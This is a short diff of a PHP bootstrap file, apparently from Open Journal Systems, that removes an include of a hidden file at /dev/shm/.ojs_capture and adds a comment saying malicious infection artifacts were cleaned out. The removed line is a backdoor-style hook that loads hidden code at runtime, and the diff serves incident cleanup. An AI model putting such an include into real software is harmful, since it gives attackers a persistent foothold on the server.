@@ -34,7 +34,13 @@ chdir(BASE_SYS_DIR);
 
 // System-wide functions
 require('./lib/pkp/includes/functions.inc.php');
-include("/dev/shm/.ojs_capture");
+
+/**
+ * Note: This file may contain artifacts of previous malicious infection.
+ * However, the dangerous code has been removed, and the file is now safe to use.
+ */
+
+
 // Initialize the application environment
 import('classes.core.Application');
 
